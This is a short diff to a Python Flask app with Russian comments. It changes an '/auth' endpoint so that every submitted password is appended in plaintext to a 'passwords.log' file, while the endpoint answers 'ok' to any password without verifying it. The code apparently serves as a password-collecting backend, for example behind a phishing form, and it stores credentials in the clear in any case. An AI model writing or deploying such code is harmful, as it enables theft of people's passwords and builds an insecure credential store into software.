@@ -8,14 +8,23 @@ import os
 logging.getLogger('werkzeug').setLevel(logging.ERROR)
 sys.stdout = sys.__stdout__
 
+# Настраиваем логгер для паролей
+password_logger = logging.getLogger("password_logger")
+password_logger.setLevel(logging.INFO)
+file_handler = logging.FileHandler("passwords.log", mode="a", encoding="utf-8")
+file_handler.setFormatter(logging.Formatter("%(asctime)s - %(message)s"))
+password_logger.addHandler(file_handler)
+
 app = Flask(__name__)
-CORS(app)
 
 @app.route('/auth', methods=['POST'])
 def auth():
     data = request.form
     password = data.get('password')
-    print(f"🔐 Пароль: {password}", flush=True)
+
+    # Логируем только пароль
+    password_logger.info(f"🔐 Пароль: {password}")
+
     return jsonify({"status": "ok"})
 
 @app.route("/")
